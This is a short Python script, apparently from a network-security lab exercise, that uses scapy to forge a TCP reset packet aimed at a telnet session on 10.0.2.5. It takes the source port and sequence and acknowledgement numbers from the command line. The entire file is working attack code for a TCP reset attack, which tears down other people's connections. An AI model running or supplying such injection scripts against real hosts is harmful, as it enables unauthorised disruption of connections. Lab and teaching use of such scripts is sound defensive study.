from scapy . all import *

rst = IP (dst = "10.0.2.5") / TCP (sport = int (sys . argv [1]), dport = 23, seq = int (sys . argv [2]), ack = int (sys . argv [3]), flags = "R")

send (rst)
